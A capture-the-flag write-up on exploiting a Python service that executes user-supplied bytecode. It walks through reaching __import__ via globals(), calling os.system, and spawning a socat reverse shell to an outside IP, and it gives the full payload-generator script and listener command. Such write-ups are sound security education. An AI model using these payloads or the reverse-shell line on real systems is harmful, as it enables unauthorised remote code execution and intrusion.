# Puffer Overflow

### Writeup by Segway, 650 points

`We've found an exploitable network service. Exploit it! For your convenience, the source has been provided.`

The challenge's source is provided below:

```python
def put_on_stack(string):
    """
    Generate the bytecode required to put a single string
    onto the stack.
    """
    op = b""
    for n, i in enumerate(string):
        # LOAD_GLOBAL 0 (chr)
        op += b"t\x00"

        # LOAD_CONST n
        op += b"d" + bytes([ord(i)])

        # CALL_FUNCTION 1
        op += b"\x83\x01"

        if n != 0:
            # BINARY_ADD
            op += b"\x17\x00"
    return op

def execute_bytecode(code):
    """
    Executes the provided bytecode. Handy for getting the
    top item off the stack.
    """
    from types import CodeType
    import builtins

    # This should be large enough for most things
    stacksize = 1024

    # Load in enough for put_on_stack to work.
    # NOTE: This function is unable to call "import" or similar
    #       dangerous things due to co_names acting as a whitelist.
    #     (Python loads names from a constants array, so it can"t
    #      load something that"s not there!)
    consts = (*range(256), )
    names = ("chr", "ord", "globals", "locals", "getattr", "setattr")

    # Tag on a trailing RETURN call just incase.
    code += b"S\x00"
    # Construt the code object
    inject = CodeType(
        0,  # For python 3.8
        0, 0, 0, stacksize, 2, code, consts,
        names, (), "", "", 0, b"", (), ()
    )

    # Create a copy of globals() and load in builtins. builtins aren"t
    # normally included in global scope.
    globs = dict(globals())
    globs.update({i: getattr(builtins, i) for i in dir(builtins)})

    # Go go go!
    return eval(inject, globs)

def smart_input():
    """
    This function aims to make python 3's input smart:tm:
    It checks if you're piping or redirecting, and switches to reading
    from stdin directly.
    """
    import os, sys, stat
    mode = os.fstat(0).st_mode

    if stat.S_ISREG(mode) or stat.S_ISFIFO(mode):
        return sys.stdin.buffer.read()
    return input().encode()

print("Hello!")
print("What's your name?")
name = smart_input()
name = put_on_stack(name[:32].decode()) + name[32:]
print(f"Hello {execute_bytecode(name)}!")
print("It's nice to meet you!")
```

## Part 1: Analysis

From inspecting the source code, we can reach some conclusions:
* `smart_input()` returns a `bytes` object
* The first 32 characters are loaded as a string using `put_on_stack()`
* The rest of the name is executed as-is

In `execute_bytecode()`, two things stand out:
* Although the code generated by `put_on_stack()` only uses the `chr()` function, other functions are available in its global scope, including `globals()`
* `globals()` has Python's built-in functions added to it.

The comments claim that the function is unable to call the `import` statement, as it is not present. However, the `import` statement calls the builtin `__import__()` function, which has been imported into the global scope. Since `globals()` is present, we can access the `__import__()` function, and import whatever module we want.

## Part 2: Getting to \_\_import\_\_

The global names available to `execute_bytecode()` are determined by `names`, which defines the `co_names` variable that determines which functions can be executed. In order to run `globals()`, we need to both fetch the function, and call it.

As is shown in `put_on_stack()`, fetching the function can be done using `LOAD_GLOBAL`, and calling the function can be done using `CALL_FUNCTION`. 

The [documentation for the dis module](https://docs.python.org/3/library/dis.html), which has a list of all bytecode instructions, shows that `LOAD_GLOBAL` takes in the index of the global in `co_names` as an argument, and `CALL_FUNCTION` takes in the number of positional arguments as an argument.

Since `globals()` has an index of 2 on `co_names`, and takes no arguments, the code we need is:

```
LOAD_GLOBAL 2
CALL_FUNCTION 0
```

Using [`dis.opmap`](https://docs.python.org/3/library/dis.html#dis.opmap) (or just looking at `put_on_stack()`) we see that the bytecode for `LOAD_GLOBAL` is `t`, and the bytecode for `CALL_FUNCTION` is `\x83`, leaving us with a payload of `t\x02\x83\x00`.

Since `smart_input()` returns a `bytes` object, we also output a `bytes` object.

However, when you try to `print` the payload (with 32 characters of padding beforehand) and pipe it into the program, this happens:

```
$ python -c "print(b'QRSRARFGENGRLBHEFRYSLBHJRROERRRRt\x02\x83\x00')" | python main.py

Hello!
What's your name?
zsh: done                              python -c "print(b'QRSRARFGENGRLBHEFRYSLBHJRROERRRRt\x02\x83\x00')" |
zsh: segmentation fault (core dumped)  python main.py
```

To figure out what happened, we pipe the payload into `xxd`:

```
$ python -c "print(b'QRSRARFGENGRLBHEFRYSLBHJRROERRRRt\x02\x83\x00')" | xxd

00000000: 6227 5152 5352 4152 4647 454e 4752 4c42  b'QRSRARFGENGRLB
00000010: 4845 4652 5953 4c42 484a 5252 4f45 5252  HEFRYSLBHJRROERR
00000020: 5252 745c 7830 325c 7838 335c 7830 3027  RRt\x02\x83\x00'
00000030: 0a                                       .
```

The `print()` function [implicitly converts its arguments to strings](https://docs.python.org/3/library/functions.html#print) before outputting them, which means our payload doesn't get output properly, which is mentioned in the documentation. However, [`sys.stdout.buffer.write()`](https://docs.python.org/3/library/sys.html#sys.stdout) is able to output bytes to stdout, so we can use that:

```
$ python -c "import sys;sys.stdout.buffer.write(b'QRSRARFGENGRLBHEFRYSLBHJRROERRRRt\x02\x83\x00')" | xxd

00000000: 5152 5352 4152 4647 454e 4752 4c42 4845  QRSRARFGENGRLBHE
00000010: 4652 5953 4c42 484a 5252 4f45 5252 5252  FRYSLBHJRROERRRR
00000020: 7402 8300                                t...
```
Now that we have our payload being output properly, we can pipe it into the program:

```
$ python -c "import sys;sys.stdout.buffer.write(b'QRSRARFGENGRLBHEFRYSLBHJRROERRRRt\x02\x83\x00')" | python main.py

Hello!
What's your name?
Hello {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'main.py', '__cached__': None, 'put_on_stack': <function put_on_stack at 0x7fa2e47ce670>, 'execute_bytecode': <function execute_bytecode at 0x7fa2e47ce700>, 'smart_input': <function smart_input at 0x7fa2e47ce790>, 'name': b't\x00dQ\x83\x01t\x00dR\x83\x01\x17\x00t\x00dS\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dA\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dF\x83\x01\x17\x00t\x00dG\x83\x01\x17\x00t\x00dE\x83\x01\x17\x00t\x00dN\x83\x01\x17\x00t\x00dG\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dL\x83\x01\x17\x00t\x00dB\x83\x01\x17\x00t\x00dH\x83\x01\x17\x00t\x00dE\x83\x01\x17\x00t\x00dF\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dY\x83\x01\x17\x00t\x00dS\x83\x01\x17\x00t\x00dL\x83\x01\x17\x00t\x00dB\x83\x01\x17\x00t\x00dH\x83\x01\x17\x00t\x00dJ\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dO\x83\x01\x17\x00t\x00dE\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x00dR\x83\x01\x17\x00t\x02\x83\x00', 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BaseException': <class 'BaseException'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'BufferError': <class 'BufferError'>, 'BytesWarning': <class 'BytesWarning'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionError': <class 'ConnectionError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EOFError': <class 'EOFError'>, 'Ellipsis': Ellipsis, 'EnvironmentError': <class 'OSError'>, 'Exception': <class 'Exception'>, 'False': False, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'FutureWarning': <class 'FutureWarning'>, 'GeneratorExit': <class 'GeneratorExit'>, 'IOError': <class 'OSError'>, 'ImportError': <class 'ImportError'>, 'ImportWarning': <class 'ImportWarning'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'KeyError': <class 'KeyError'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NameError': <class 'NameError'>, 'None': None, 'NotADirectoryError': <class 'NotADirectoryError'>, 'NotImplemented': NotImplemented, 'NotImplementedError': <class 'NotImplementedError'>, 'OSError': <class 'OSError'>, 'OverflowError': <class 'OverflowError'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'RecursionError': <class 'RecursionError'>, 'ReferenceError': <class 'ReferenceError'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeError': <class 'RuntimeError'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'SystemError': <class 'SystemError'>, 'SystemExit': <class 'SystemExit'>, 'TabError': <class 'TabError'>, 'TimeoutError': <class 'TimeoutError'>, 'True': True, 'TypeError': <class 'TypeError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, '__build_class__': <built-in function __build_class__>, '__debug__': True, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'bool': <class 'bool'>, 'breakpoint': <built-in function breakpoint>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'classmethod': <class 'classmethod'>, 'compile': <built-in function compile>, 'complex': <class 'complex'>, 'copyright': Copyright (c) 2001-2020 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'delattr': <built-in function delattr>, 'dict': <class 'dict'>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'enumerate': <class 'enumerate'>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'filter': <class 'filter'>, 'float': <class 'float'>, 'format': <built-in function format>, 'frozenset': <class 'frozenset'>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'help': Type help() for interactive help, or help(object) for help about object., 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'int': <class 'int'>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'license': Type license() to see the full license text, 'list': <class 'list'>, 'locals': <built-in function locals>, 'map': <class 'map'>, 'max': <built-in function max>, 'memoryview': <class 'memoryview'>, 'min': <built-in function min>, 'next': <built-in function next>, 'object': <class 'object'>, 'oct': <built-in function oct>, 'open': <built-in function open>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'property': <class 'property'>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'range': <class 'range'>, 'repr': <built-in function repr>, 'reversed': <class 'reversed'>, 'round': <built-in function round>, 'set': <class 'set'>, 'setattr': <built-in function setattr>, 'slice': <class 'slice'>, 'sorted': <built-in function sorted>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'sum': <built-in function sum>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'vars': <built-in function vars>, 'zip': <class 'zip'>}!
It's nice to meet you!
```

As we can see, this works locally. However, when we try this on the remote instance:

```
$ python -c "import sys;sys.stdout.buffer.write(b'QRSRARFGENGRLBHEFRYSLBHJRROERRRRt\x02\x83\x00')" | socat - TCP4:95.216.233.106:42903

Hello!
What's your name?
```

No response. What happened? Since the remote instance is running over a socket, we need to append a newline character so that the input is terminated. This newline character is stripped on the remote instance before execution, but not locally, so when testing locally, we need to remove the trailing newline.
Alternatively, we can just edit our local copy of the challenge so it strips trailing whitespace.

However, the simplest solution is just to stop testing locally.

Here's what happens when we run the payload with a newline:
```
$ python -c "import sys;sys.stdout.buffer.write(b'QRSRARFGENGRLBHEFRYSLBHJRROERRRRt\x02\x83\x00\n')" | socat - TCP4:95.216.233.106:42903

Hello!
What's your name?
Hello {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/srv/challenge/pybo.py', '__cached__': None, 'main': <function main at 0x7f989c03d4d0>, 'server': <function server at 0x7f989c03d560>, '__warningregistry__': {'version': 0}, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BaseException': <class 'BaseException'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'BufferError': <class 'BufferError'>, 'BytesWarning': <class 'BytesWarning'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionError': <class 'ConnectionError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EOFError': <class 'EOFError'>, 'Ellipsis': Ellipsis, 'EnvironmentError': <class 'OSError'>, 'Exception': <class 'Exception'>, 'False': False, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'FutureWarning': <class 'FutureWarning'>, 'GeneratorExit': <class 'GeneratorExit'>, 'IOError': <class 'OSError'>, 'ImportError': <class 'ImportError'>, 'ImportWarning': <class 'ImportWarning'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'KeyError': <class 'KeyError'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NameError': <class 'NameError'>, 'None': None, 'NotADirectoryError': <class 'NotADirectoryError'>, 'NotImplemented': NotImplemented, 'NotImplementedError': <class 'NotImplementedError'>, 'OSError': <class 'OSError'>, 'OverflowError': <class 'OverflowError'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'RecursionError': <class 'RecursionError'>, 'ReferenceError': <class 'ReferenceError'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeError': <class 'RuntimeError'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'SystemError': <class 'SystemError'>, 'SystemExit': <class 'SystemExit'>, 'TabError': <class 'TabError'>, 'TimeoutError': <class 'TimeoutError'>, 'True': True, 'TypeError': <class 'TypeError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, '__build_class__': <built-in function __build_class__>, '__debug__': True, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'bool': <class 'bool'>, 'breakpoint': <built-in function breakpoint>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'classmethod': <class 'classmethod'>, 'compile': <built-in function compile>, 'complex': <class 'complex'>, 'copyright': Copyright (c) 2001-2020 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'delattr': <built-in function delattr>, 'dict': <class 'dict'>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'enumerate': <class 'enumerate'>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'filter': <class 'filter'>, 'float': <class 'float'>, 'format': <built-in function format>, 'frozenset': <class 'frozenset'>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'help': Type help() for interactive help, or help(object) for help about object., 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'int': <class 'int'>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'license': Type license() to see the full license text, 'list': <class 'list'>, 'locals': <built-in function locals>, 'map': <class 'map'>, 'max': <built-in function max>, 'memoryview': <class 'memoryview'>, 'min': <built-in function min>, 'next': <built-in function next>, 'object': <class 'object'>, 'oct': <built-in function oct>, 'open': <built-in function open>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'property': <class 'property'>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'range': <class 'range'>, 'repr': <built-in function repr>, 'reversed': <class 'reversed'>, 'round': <built-in function round>, 'set': <class 'set'>, 'setattr': <built-in function setattr>, 'slice': <class 'slice'>, 'sorted': <built-in function sorted>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'sum': <built-in function sum>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'vars': <built-in function vars>, 'zip': <class 'zip'>}!
It's nice to meet you!
```

Now that we have the global scope as a dictionary, we can see that `__import__` is indeed present. But how do we access it? In Python code, this would be done with `globals()["__import__"]`, so we need to find a way of converting this into bytecode. It turns out that [`BINARY_SUBSCR`](https://docs.python.org/3/library/dis.html#opcode-BINARY_SUBSCR) is an operation that does exactly that. Since we need to pass a string to fetch a value from a dictionary, we use `put_on_stack("__import__")` to generate the corresponding bytecode:

```python
import sys

def put_on_stack(string):
    """
    Generate the bytecode required to put a single string
    onto the stack.
    """
    op = b""
    for n, i in enumerate(string):
        # LOAD_GLOBAL 0 (chr)
        op += b"t\x00"

        # LOAD_CONST n
        op += b"d" + bytes([ord(i)])

        # CALL_FUNCTION 1
        op += b"\x83\x01"

        if n != 0:
            # BINARY_ADD
            op += b"\x17\x00"
    return op

payload = b"t\x02\x83\x00"
payload += put_on_stack("__import__") + b"\x19\x00"

sys.stdout.buffer.write(b"QRSRARFGENGRLBHEFRYSLBHJRROERRRR"+payload+b"\n")
```

From now on, we can simply run the script and pipe the output directly to `socat` after amending our payload, saving time.

Running the payload:

```
$ python payload_writeup.py | socat - TCP4:95.216.233.106:42903  

Hello!
What's your name?
Hello <built-in function __import__>!
It's nice to meet you!
```

And now we're free to import whatever modules we want!

## Part 3: Getting RCE

So now that we can import modules, we can proceed with trying to get the flag. , getting a shell is (arguably) the most fun way of doing so, since you get complete RCE. 

The simplest way of getting code execution in Python is using `os.system()`. However, since it does not return its output, but only its status code, we only know whether a command succeeded or failed. However, it proves to not be an issue.

In order to load the `os` module, we append the following to our payload:
```python
payload += put_on_stack("os") + b"\x83\x01"
```
This results in `"os"` being added to the stack, and `__import__()` being called with `"os"` as an argument:

```
Hello!
What's your name?
Hello <module 'os' from '/usr/local/lib/python3.7/os.py'>!
It's nice to meet you!
```
(Note that from now on, only the challenge output is being shown, since the string to run the challenge remains the same as before.)

Since the `system()` function is an attribute normally fetched using dot notation, we need to use [`getattr()`](https://docs.python.org/3/library/functions.html#getattr), which is located in `co_names`, meaning we can fetch it directly.

The code we want to execute now is `getattr(globals()["__import__"]("os"),"system")`, which corresponds to the following payload:

```python
payload =  b"t\x04"  # loads getattr
payload += b"t\x02\x83\x00" # globals
payload += put_on_stack("__import__") + b"\x19\x00" # __import__ function
payload += put_on_stack("os") + b"\x83\x01" # os module
payload += put_on_stack("system") + b"\x83\x02"  # system function
```

It works:

```
Hello!
What's your name?
Hello <built-in function system>!
It's nice to meet you!
```

Which means that we can run any system command by calling `system()`:

```python
payload =  b"t\x04"  # loads getattr
payload += b"t\x02\x83\x00" # globals
payload += put_on_stack("__import__") + b"\x19\x00" # __import__ function
payload += put_on_stack("os") + b"\x83\x01" # os module
payload += put_on_stack("system") + b"\x83\x02" # system function
payload += put_on_stack("whoami") + b"\x83\x01" # command to run
```

Output:
```
Hello!
What's your name?
Hello 0!
It's nice to meet you!
```

As we can see, the return code 0 is output, meaning we have RCE.

## Part 4: Getting A Shell

Although we have RCE, it is blind and non-interactive, meaning that we cannot obtain any output. Although we can use Python itself to provide a reverse shell, it turns out that `socat -V` succeeds, meaning that the `socat` binary is present on the machine:

```python
payload += put_on_stack("socat -V") + b"\x83\x01" # command to run
```

The output is the same as before, since the command succeeded.

There are some caveats to consider, however, since the challenge runs on a Docker container (as are all instance challenges in this CTF):
* `/bin/bash` is not present, so `/bin/sh` needs to be executed instead.
* The container does not have DNS support, so only IP addresses can be provided.

With that in mind, we can then have a reverse shell connect to a VPS, to a port forwarded computer, or through a TCP tunnel using ngrok, although there are probably other alternatives.

We run the following on the machine receiving the reverse shell: `socat file:`tty`,raw,echo=0 tcp-listen:4242`

The full payload is as follows:

```python
payload =  b"t\x04"  # loads getattr
payload += b"t\x02\x83\x00" # globals
payload += put_on_stack("__import__") + b"\x19\x00" # __import__ function
payload += put_on_stack("os") + b"\x83\x01" # os module
payload += put_on_stack("system") + b"\x83\x02" # system function
# The IP for the ngrok tunnel used changes frequently, so this has to be run promptly
payload += put_on_stack("socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:3.20.98.123:11473 &") + b"\x83\x01" # runs socat
```
(socat is ran as a background process so that `os.system()` can return successfully)

We run the script. We get the standard success output from the challenge. On the listening machine:
```
$ socat file:`tty`,raw,echo=0 tcp-listen:4242 

sh: can't access tty; job control turned off
/ $
```

## Part 5: Actually Getting the Flag

We now have a fully interactive TTY on the challenge container.

```
sh: can't access tty; job control turned off
/ $ ls
bin    etc    lib    mnt    proc   run    srv    tmp    var
dev    home   media  opt    root   sbin   sys    usr
/ $ find flag.txt
find: flag.txt: No such file or directory
/ $ man find
sh: man: not found
/ $ cd ~
~ $ ls
flag.txt
~ $ cat flag.txt
ractf{Puff3rf1sh??}
~ $
```

The flag is `ractf{Puff3rf1sh??}`.

The final script used to generate the reverse shell payload is: 

```python
import sys

def put_on_stack(string):
    """
    Generate the bytecode required to put a single string
    onto the stack.
    """
    op = b""
    for n, i in enumerate(string):
        # LOAD_GLOBAL 0 (chr)
        op += b"t\x00"

        # LOAD_CONST n
        op += b"d" + bytes([ord(i)])

        # CALL_FUNCTION 1
        op += b"\x83\x01"

        if n != 0:
            # BINARY_ADD
            op += b"\x17\x00"
    return op

payload =  b"t\x04"  # loads getattr
payload += b"t\x02\x83\x00" # globals
payload += put_on_stack("__import__") + b"\x19\x00" # __import__ function
payload += put_on_stack("os") + b"\x83\x01" # os module
payload += put_on_stack("system") + b"\x83\x02" # system function
# The IP for the ngrok tunnel used changes frequently, so this has to be run promptly
payload += put_on_stack("socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:3.20.98.123:11473 &") + b"\x83\x01" # runs socat

sys.stdout.buffer.write(b"QRSRARFGENGRLBHEFRYSLBHJRROERRRR"+payload+b"\n")
```


